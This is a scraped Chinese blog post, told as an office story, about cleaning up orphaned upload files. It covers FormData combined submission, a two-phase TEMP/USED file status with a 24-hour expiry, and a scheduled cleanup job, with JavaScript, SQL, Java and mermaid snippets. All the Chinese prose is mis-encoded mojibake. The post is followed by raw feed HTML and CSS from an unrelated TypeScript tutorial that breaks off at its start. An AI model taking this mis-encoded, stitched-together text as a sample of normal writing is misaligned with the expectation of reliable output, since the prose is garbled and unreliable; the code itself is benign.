<p>â€œè±†å­ï¼â€èƒ–å“¥ç›´æ¥æ€åˆ°äº†æˆ‘å·¥ä½ï¼Œâ€œä½ ä»¬é‚£ä¸ªâ€˜ç”¨æˆ·åé¦ˆâ€™åŠŸèƒ½æ˜¯ä¸æ˜¯æœ‰æ¯’ï¼Ÿæˆ‘çœ‹ OSS å­˜å‚¨æ¡¶é‡Œçš„æ–‡ä»¶æ•°é‡è¿™å‘¨æ¿€å¢äº† 50%ï¼Œä½†æ•°æ®åº“é‡Œçš„åé¦ˆè®°å½•æ ¹æœ¬æ²¡å‡ æ¡å•Šï¼â€</p>
<p>æ­£è¯´ç€ï¼Œå°æ±ç«¯ç€å¥¶èŒ¶å‡‘äº†è¿‡æ¥ï¼Œä¸€è„¸æ— è¾œåˆå¸¦ç€ç‚¹å¿ƒè™šï¼šâ€œé‚£ä¸ªâ€¦â€¦æˆ‘ä¹Ÿå‘ç°äº†ã€‚å¾ˆå¤šç”¨æˆ·ä¸Šä¼ äº†æˆªå›¾ï¼Œç»“æœæ²¡ç‚¹â€˜æäº¤â€™å°±å…³é¡µé¢è·‘è·¯äº†ã€‚é‚£äº›å›¾ç‰‡å°±æˆäº†æ²¡äººè¦çš„å­¤å„¿ï¼Œä¸€ç›´èµ–åœ¨æœåŠ¡å™¨ä¸Šã€‚â€</p>
<p>â€œå¥½å®¶ä¼™ï¼Œâ€æˆ‘æ‰¶é¢ï¼Œâ€œåˆç€æˆ‘ä»¬æ˜¯åœ¨åšâ€˜ç½‘ç»œåƒåœ¾å›æ”¶ç«™â€™å•Šã€‚â€</p>
<p>è¿™å…¶å®æ˜¯ä¸€ä¸ªéå¸¸ç»å…¸çš„å·¥ç¨‹é—®é¢˜ï¼š<strong>å¼‚æ­¥çš„æ–‡ä»¶ä¸Šä¼ </strong>ä¸<strong>åŸå­çš„ä¸šåŠ¡æäº¤</strong>ä¸ä¸€è‡´ï¼Œå¯¼è‡´äº†â€œ<strong>å­¤å„¿èµ„æºï¼ˆOrphan Fileï¼‰</strong>â€ã€‚</p>
<h2 data-id="heading-1">ğŸ¯ åœºæ™¯è¿˜åŸ</h2>
<p>å°æ±æ‰“å¼€äº†å¥¹çš„ä»£ç ï¼ŒæŒ‡ç€é‚£ä¸ªä¸Šä¼ ç»„ä»¶ï¼š</p>
<p>â€œç°åœ¨çš„é€»è¾‘æ˜¯è¿™æ ·çš„ï¼šâ€</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. ç”¨æˆ·é€‰å›¾ï¼Œç«‹å³ä¸Šä¼ </span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">onUpload</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">file</span>) =&gt; {
  <span class="hljs-keyword">const</span> url = <span class="hljs-keyword">await</span> <span class="hljs-title function_">uploadAPI</span>(file); <span class="hljs-comment">// æ–‡ä»¶ç›´æ¥è½ç›˜</span>
  form.<span class="hljs-property">imageUrl</span> = url;               <span class="hljs-comment">// æ‹¿åˆ° URL å¡«å…¥è¡¨å•</span>
};

<span class="hljs-comment">// 2. ç”¨æˆ·å¯èƒ½... æ°¸è¿œä¸ç‚¹å‡»æäº¤</span>
<span class="hljs-comment">// const onSubmit = async () =&gt; { ... } </span>
</code></pre>
<p>â€œåªè¦ç”¨æˆ·ä¸Šä¼ äº†å›¾ç‰‡ï¼Œâ€å°æ±å¹äº†æ°”ï¼Œâ€œä¸ç®¡ä»–æœ€åæä¸æäº¤è¡¨å•ï¼Œè¿™æ–‡ä»¶éƒ½å·²ç»å­˜ä¸‹æ¥äº†ã€‚ç°åœ¨çš„æœåŠ¡å™¨é‡Œï¼Œä¼°è®¡æœ‰ä¸€åŠéƒ½æ˜¯è¿™ç§â€˜å¹½çµæ–‡ä»¶â€™ã€‚â€</p>
<p>â€œå¦‚æœæ˜¯å°æ–‡ä»¶ï¼Œâ€å°æ±çªç„¶çœ¼ç›ä¸€äº®ï¼Œâ€œå…¶å®æˆ‘æœ‰æ‹›ï¼æˆ‘ä»¬èƒ½ä¸èƒ½åˆ«è¿™ä¹ˆæ€¥ç€ä¸Šä¼ ï¼Ÿâ€</p>
<p>å¥¹å¿«é€Ÿæ•²äº†å‡ è¡Œä»£ç ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ–¹æ¡ˆä¸€ï¼šæ··åˆæäº¤ï¼ˆFormDataï¼‰</span>
<span class="hljs-keyword">async</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">data, imageFile</span>) {
  <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>()
  <span class="hljs-comment">// æŠŠ JSON æ•°æ®è½¬æˆ Blob å¡è¿›å»</span>
  formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'data'</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Blob</span>([<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data)], { <span class="hljs-attr">type</span>: <span class="hljs-string">'application/json'</span> }))
  
  <span class="hljs-keyword">if</span> (imageFile) {
    <span class="hljs-comment">// å‰ç«¯å…ˆå‹ç¼©ï¼Œéšè¡¨å•ä¸€èµ·æäº¤</span>
    <span class="hljs-keyword">const</span> webpFile = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convertImageToWebp</span>(imageFile, <span class="hljs-number">0.8</span>)
    formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'imageFile'</span>, webpFile)
  }
  
  <span class="hljs-comment">// ä¸€æ¬¡è¯·æ±‚ï¼Œæå®šæ‰€æœ‰</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">request</span>({ <span class="hljs-attr">url</span>: <span class="hljs-string">'/reward'</span>, <span class="hljs-attr">method</span>: <span class="hljs-string">'post'</span>, <span class="hljs-attr">data</span>: formData })
}
</code></pre>
<p>â€œä½ çœ‹ï¼Œâ€å°æ±å¾—æ„åœ°è¯´ï¼Œâ€œè¿™æ ·æ–‡ä»¶å’Œè¡¨å•æ˜¯<strong>åŸå­æ€§</strong>çš„ã€‚è¦ä¹ˆéƒ½æˆåŠŸï¼Œè¦ä¹ˆéƒ½å¤±è´¥ï¼Œæ ¹æœ¬ä¸ä¼šæœ‰å­¤å„¿æ–‡ä»¶ï¼â€</p>
<h2 data-id="heading-2">ğŸ§  æ€è·¯åˆ†æ</h2>
<p>â€œå°æ±è¿™æ‹›â€˜æ··åˆæäº¤â€™ï¼Œå¯¹ä»˜å°å¤´åƒã€å°æˆªå›¾ç¡®å®å¤Ÿç”¨ã€‚â€</p>
<p>é˜¿è¾°ä¸çŸ¥ä½•æ—¶ç«™åœ¨äº†æˆ‘ä»¬èº«åï¼Œæ‰‹é‡Œä¾æ—§æ˜¯é‚£ä¸ªä¿æ¸©æ¯ã€‚ä»–çœ‹äº†ä¸€çœ¼ä»£ç ï¼Œæ·¡æ·¡åœ°è¯´ï¼šâ€œä½†å¦‚æœç”¨æˆ·è¦ä¸Šä¼ ä¸€ä¸ª 500MB çš„è§†é¢‘å‘¢ï¼Ÿæˆ–è€…å¼±ç½‘ç¯å¢ƒä¸‹ä¸Šä¼  10 å¼ é«˜æ¸…å›¾å‘¢ï¼Ÿä½ è®©ç”¨æˆ·ç‚¹æäº¤æŒ‰é’®åå¹²ç­‰å‡ åç§’ï¼Ÿä½“éªŒä¼šå´©çš„ã€‚â€</p>
<p>å°æ±æ„£äº†ä¸€ä¸‹ï¼Œé»˜é»˜æ”¶å›äº†å¾—æ„çš„ç¬‘å®¹ã€‚</p>
<p>é˜¿è¾°æ‹‰è¿‡ç™½æ¿ï¼Œç”»äº†ä¸¤ä¸ªåœˆï¼š</p>
<p>â€œå¯¹äºå¤§æ–‡ä»¶æˆ–é€šç”¨åœºæ™¯ï¼Œæˆ‘ä»¬è¿˜æ˜¯å¾—èµ°å¼‚æ­¥ä¸Šä¼ ã€‚ä½†å…³é”®åœ¨äºâ€”â€”<strong>â€˜ä¸Šä¼  â‰  ç”Ÿæ•ˆâ€™</strong>ã€‚â€</p>
<p>ä»–å†™ä¸‹äº†ä¸€ä¸ªè¯ï¼š<strong>ä¸¤é˜¶æ®µæäº¤</strong>ã€‚</p>
<p>â€œæˆ‘ä»¬ç»™æ–‡ä»¶è®¾è®¡ä¸ªç”Ÿå‘½å‘¨æœŸï¼Œå°±åƒ<strong>åŠç­¾è¯</strong>ä¸€æ ·ï¼šâ€</p>
<ol>
<li><strong>ä¸´æ—¶æ€ (TEMP)</strong>ï¼šåˆšä¸Šä¼ çš„æ–‡ä»¶ï¼Œé»˜è®¤éƒ½æ˜¯â€œä¸´æ—¶è®¿å®¢â€ã€‚ç»™å®ƒå‘ä¸ªæœ‰æ•ˆæœŸ 24 å°æ—¶çš„â€œä¸´æ—¶å±…ä½è¯â€ã€‚</li>
<li><strong>è½¬æ­£ (USED)</strong>ï¼šåªæœ‰å½“è¡¨å•æäº¤æˆåŠŸäº†ï¼Œåç«¯æ‰ä¼šåœ¨äº‹åŠ¡é‡Œç»™è¿™ä¸ªæ–‡ä»¶ç›–ä¸ªç« ï¼Œå˜æˆâ€œæ°¸ä¹…å±…æ°‘â€ã€‚</li>
<li><strong>é©±é€</strong>ï¼šè¿‡æœŸè¿˜æ²¡è½¬æ­£çš„ï¼Œç›´æ¥ç”±å®šæ—¶ä»»åŠ¡æ¸…ç†æ‰ã€‚</li>
</ol>
<h2 data-id="heading-3">ğŸ’» ä»£ç å®æˆ˜</h2>
<p>è¯´å¹²å°±å¹²ã€‚æˆ‘ä»¬å†³å®šé‡‡ç”¨ <strong>æ–¹æ¡ˆäºŒï¼ˆä¸¤é˜¶æ®µæäº¤ï¼‰</strong> ä½œä¸ºä¸»æ–¹æ¡ˆï¼Œå°æ±çš„ <strong>æ–¹æ¡ˆä¸€ï¼ˆæ··åˆæäº¤ï¼‰</strong> ä½œä¸ºè½»é‡çº§åœºæ™¯çš„å¤‡é€‰ã€‚</p>
<h3 data-id="heading-4">1. æ•°æ®åº“å±‚æ”¹é€ ï¼šç»™æ–‡ä»¶åŠ ä¸ªèº«ä»½</h3>
<p>æˆ‘ä»¬éœ€è¦ä¸€å¼ ç»Ÿä¸€çš„ <code>sys_file</code> è¡¨æ¥ç®¡ç†æ‰€æœ‰æ–‡ä»¶ã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `sys_file` (
  `id` <span class="hljs-type">bigint</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  `url` <span class="hljs-type">varchar</span>(<span class="hljs-number">500</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  `status` tinyint <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">0</span>, <span class="hljs-comment">-- 0: TEMP(ä¸´æ—¶), 1: USED(å·²ç¡®è®¤)</span>
  `expire_time` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>, <span class="hljs-comment">-- ä¸´æ—¶æ–‡ä»¶è¿‡æœŸæ—¶é—´</span>
  `create_time` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>
);
</code></pre>
<h3 data-id="heading-5">2. åç«¯é€»è¾‘ï¼šä¸Šä¼ å³â€œä¸´æ—¶â€</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸Šä¼ æ¥å£</span>
<span class="hljs-keyword">public</span> FileVO <span class="hljs-title function_">upload</span><span class="hljs-params">(MultipartFile file)</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> ossService.upload(file);
    
    <span class="hljs-type">SysFile</span> <span class="hljs-variable">sysFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SysFile</span>();
    sysFile.setUrl(url);
    sysFile.setStatus(Status.TEMP); <span class="hljs-comment">// é»˜è®¤æ˜¯ä¸´æ—¶æ€</span>
    sysFile.setExpireTime(LocalDateTime.now().plusHours(<span class="hljs-number">24</span>)); <span class="hljs-comment">// 24å°æ—¶åè¿‡æœŸ</span>
    
    fileMapper.insert(sysFile);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileVO</span>(sysFile.getId(), url);
}
</code></pre>
<h3 data-id="heading-6">3. ä¸šåŠ¡æäº¤ï¼šäº‹åŠ¡å†…â€œè½¬æ­£â€</h3>
<p>è¿™æ˜¯æœ€å…³é”®çš„ä¸€æ­¥ã€‚åªæœ‰ä¸šåŠ¡æˆåŠŸäº†ï¼Œæ–‡ä»¶æ‰èƒ½æ´»ä¸‹æ¥ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">submitFeedback</span><span class="hljs-params">(FeedbackForm form)</span> {
    <span class="hljs-comment">// 1. ä¿å­˜ä¸šåŠ¡æ•°æ®</span>
    feedbackMapper.save(form);
    
    <span class="hljs-comment">// 2. ã€å…³é”®ã€‘å°†æ–‡ä»¶æ ‡è®°ä¸ºâ€œå·²ä½¿ç”¨â€</span>
    <span class="hljs-comment">// è¿™ä¸€æ­¥å¿…é¡»åœ¨äº‹åŠ¡å†…ï¼Œå¦‚æœä¿å­˜å¤±è´¥å›æ»šï¼Œæ–‡ä»¶ä¾ç„¶æ˜¯ TEMPï¼Œä¼šè¢«åç»­æ¸…ç†</span>
    <span class="hljs-keyword">if</span> (form.getFileId() != <span class="hljs-literal">null</span>) {
        fileMapper.updateStatus(form.getFileId(), Status.USED);
    }
}
</code></pre>
<h3 data-id="heading-7">4. æµç¨‹å›¾è§£</h3>
<p>ä¸ºäº†è®©é€»è¾‘æ›´æ¸…æ™°ï¼Œæˆ‘ç”»äº†ä¸ªå›¾ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant User as ç”¨æˆ·
    participant API as åç«¯API
    participant DB as æ•°æ®åº“
    participant Job as å®šæ—¶ä»»åŠ¡

    User-&gt;&gt;API: 1. ä¸Šä¼ æ–‡ä»¶
    API-&gt;&gt;DB: å­˜å…¥è®°å½• (çŠ¶æ€=TEMP, è¿‡æœŸ=24hå)
    API--&gt;&gt;User: è¿”å› fileId

    alt ç”¨æˆ·æäº¤è¡¨å•
        User-&gt;&gt;API: 2. æäº¤è¡¨å• (å¸¦ fileId)
        API-&gt;&gt;DB: å¼€å¯äº‹åŠ¡
        API-&gt;&gt;DB: ä¿å­˜ä¸šåŠ¡æ•°æ®
        API-&gt;&gt;DB: æ›´æ–°æ–‡ä»¶çŠ¶æ€ TEMP -&gt; USED
        API--&gt;&gt;User: æäº¤æˆåŠŸ
    else ç”¨æˆ·è·‘è·¯
        Note right of User: ä»€ä¹ˆéƒ½ä¸åš
    end

    loop æ¯å°æ—¶æ‰§è¡Œ
        Job-&gt;&gt;DB: æ‰«æ status=TEMP &amp; expire_time &lt; now
        Job-&gt;&gt;API: åˆ é™¤ç‰©ç†æ–‡ä»¶
        Job-&gt;&gt;DB: åˆ é™¤æ–‡ä»¶è®°å½•
    end
</code></pre>
<h2 data-id="heading-8">ğŸ“Š æ•ˆæœéªŒè¯</h2>
<p>ä¸Šçº¿ä¸€å‘¨åã€‚</p>
<p>èƒ–å“¥å†æ¬¡ä¸¢è¿‡æ¥ä¸€å¼ æˆªå›¾ï¼Œè¿™æ¬¡æ˜¯å­˜å‚¨æ¡¶çš„å¢é•¿æ›²çº¿ã€‚</p>
<p>â€œç¥äº†å•Šï¼Œâ€èƒ–å“¥å‘äº†ä¸ªå¤§æ‹‡æŒ‡è¡¨æƒ…ï¼Œâ€œè¿™å‘¨æ–‡ä»¶å¢é•¿ç‡ç›´æ¥é™äº† 40%ï¼Œè€Œä¸”æˆ‘çœ‹äº†ä¸‹å‡Œæ™¨çš„æ¸…ç†æ—¥å¿—ï¼Œæ¯å¤©è‡ªåŠ¨åˆ é™¤äº†å‡ ç™¾ä¸ªæ— æ•ˆæ–‡ä»¶ã€‚é‚£ä¸ªæŠ¥è­¦çº¢ç¯ç»ˆäºç­äº†ã€‚â€</p>
<p>å°æ±çœ‹ç€ç›‘æ§å¤§å±ï¼Œé•¿èˆ’äº†ä¸€å£æ°”ï¼šâ€œç»ˆäºä¸ç”¨æ‹…å¿ƒæˆ‘çš„ä¸Šä¼ æ¥å£å˜æˆåƒåœ¾åœºäº†ã€‚â€</p>
<h2 data-id="heading-9">ğŸ’¡ ç»éªŒæ€»ç»“</h2>
<p>è¿™æ¬¡æ²»ç†ï¼Œè®©æˆ‘ä»¬æ˜ç™½äº†ä¸€ä¸ªé“ç†ï¼š<strong>èµ„æºå¿…é¡»è¦æœ‰ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>ã€‚</p>
<p><strong>æ ¸å¿ƒè¦ç‚¹ï¼š</strong></p>
<ol>
<li><strong>åœºæ™¯åˆ†æ²»</strong>ï¼šå°æ–‡ä»¶ï¼ˆå¤´åƒ/å‡­è¯ï¼‰å¯ç”¨ <strong>FormData æ··åˆæäº¤</strong>ï¼Œç®€å•ç²—æš´é›¶å­¤å„¿ï¼›å¤§æ–‡ä»¶å¿…é¡»èµ° <strong>ä¸¤é˜¶æ®µæäº¤</strong>ã€‚</li>
<li><strong>é»˜è®¤ä¸´æ—¶</strong>ï¼šæ‰€æœ‰å¼‚æ­¥ä¸Šä¼ é»˜è®¤éƒ½æ˜¯â€œä¸´æ—¶æ€â€ï¼Œè®¾ç½® TTLï¼ˆTime To Liveï¼‰ã€‚</li>
<li><strong>åå‘ç¡®è®¤</strong>ï¼šä¸šåŠ¡æäº¤æˆåŠŸæ˜¯æ–‡ä»¶â€œè½¬æ­£â€çš„å”¯ä¸€æ¡ä»¶ã€‚</li>
</ol>
<p><strong>é¿å‘æŒ‡å—ï¼š</strong></p>
<ul>
<li>âŒ <strong>å‘1</strong>ï¼šç›´æ¥è¿”å›æœ€ç»ˆ URLã€‚å»ºè®®è¿”å› <code>fileId</code>ï¼Œè®©åç«¯æœ‰æ§åˆ¶æƒã€‚</li>
<li>âŒ <strong>å‘2</strong>ï¼šä¾èµ–å‰ç«¯åˆ é™¤ã€‚æ°¸è¿œä¸è¦ç›¸ä¿¡å‰ç«¯çš„ <code>onUnload</code> æˆ– <code>Cancel</code> äº‹ä»¶ï¼Œç½‘ç»œä¸€æ–­ä»€ä¹ˆéƒ½å‘ä¸å‡ºæ¥ã€‚</li>
<li>âœ… <strong>æ¨è</strong>ï¼šå¯¹äº OSS/S3ï¼Œè¿˜å¯ä»¥é…ç½® Bucket çš„ Lifecycle è§„åˆ™ä½œä¸ºæœ€åçš„å…œåº•ï¼ˆæ¯”å¦‚ <code>temp/</code> ç›®å½•ä¸‹çš„æ–‡ä»¶ 7 å¤©è‡ªåŠ¨ç‰©ç†åˆ é™¤ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-10">ğŸŒ™ æ”¶å°¾</h2>
<p>è§£å†³å®Œè¿™ä¸ªé—®é¢˜ï¼Œå·²ç»æ˜¯æ·±å¤œã€‚</p>
<p>é˜¿è¾°æ”¶æ‹¾å¥½åŒ…ï¼Œè·¯è¿‡æˆ‘ä»¬å·¥ä½æ—¶è¯´ï¼šâ€œæŠ€æœ¯å€ºå’Œåƒåœ¾æ–‡ä»¶ä¸€æ ·ï¼Œå¦‚æœä¸è®¾å®šæœŸé™å»æ¸…ç†ï¼Œæ€»æœ‰ä¸€å¤©ä¼šçˆ†æ‰ã€‚â€</p>
<p>æˆ‘çœ‹äº†çœ‹æœåŠ¡å™¨ç»¿è‰²çš„çŠ¶æ€ç¯ï¼Œåˆçœ‹äº†çœ‹æ—è¾¹æ­£åœ¨å–å¥¶èŒ¶çš„å°æ±ã€‚</p>
<p>â€œèµ°å§ï¼Œåƒå¤œå®µå»ï¼Ÿâ€æˆ‘æè®®ã€‚</p>
<p>â€œèµ°ï¼æˆ‘è¦åƒçƒ§çƒ¤ï¼â€å°æ±ç«‹åˆ»å¤æ´»ï¼Œä¹‹å‰çš„ç–²æƒ«ä¸€æ‰«è€Œç©ºã€‚</p>
<p>åœ¨è¿™ä¸ªæ•°æ®ä¸æ–­è†¨èƒ€çš„ä¸–ç•Œé‡Œï¼Œæ‡‚å¾—â€œæ–­èˆç¦»â€çš„ç³»ç»Ÿï¼Œæ‰èƒ½è·‘å¾—æ›´è¿œã€‚</p>
<hr/>
<p><em>è¿™é‡Œæ˜¯ã€Šæ·±å¤œä»£ç ã€‹ï¼Œæˆ‘ä»¬ä¸‹æœŸè§ã€‚</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ“˜TypeScript 2026 æœ€æ–°è¯¦ç»†æ•™ç¨‹ï¼ˆä»å…¥é—¨åˆ°å®æˆ˜ï¼‰]]></title>    <link>https://juejin.cn/post/7592518897463820340</link>    <guid>https://juejin.cn/post/7592518897463820340</guid>    <pubDate>2026-01-08T02:11:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592518897463820340" data-draft-id="7592518897463803956" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ“˜TypeScript 2026 æœ€æ–°è¯¦ç»†æ•™ç¨‹ï¼ˆä»å…¥é—¨åˆ°å®æˆ˜ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T02:11:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å“ˆå“ˆOå“ˆå“ˆå“ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/3813562999914157"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ“˜TypeScript 2026 æœ€æ–°è¯¦ç»†æ•™ç¨‹ï¼ˆä»å…¥é—¨åˆ°å®æˆ˜ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3813562999914157/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å“ˆå“ˆOå“ˆå“ˆå“ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:11:30.000Z" title="Thu Jan 08 2026 02:11:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><hr/>
<h2 data-id="heading-0">ğŸ“˜TypeScript 2026 æœ€æ–°è¯¦ç»†æ•™ç¨‹ï¼ˆä»å…¥é—¨åˆ°å®æˆ˜ï¼‰</h2>
<blockquote>
<p><strong>ä¸€å¥è¯æ€»ç»“ï¼šTypeScript = JavaScript + å¼ºç±»å‹ç³»ç»Ÿ</strong><br/>
å®ƒä¸æ˜¯ä¸€é—¨æ–°è¯­è¨€ï¼Œè€Œæ˜¯ç»™ JS åŠ ä¸Šâ€œå®‰å…¨é”â€å’Œâ€œå¯¼èˆªä»ªâ€çš„è¶…é›†ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">ä¸€ã€ä¸ºä»€ä¹ˆ 2026 å¹´å¿…é¡»å­¦ TypeScriptï¼Ÿ</h3>
<h4 data-id="heading-2">âœ… 1. è§£å†³ JavaScript çš„æ ¸å¿ƒç—›ç‚¹</h4>
<ul>
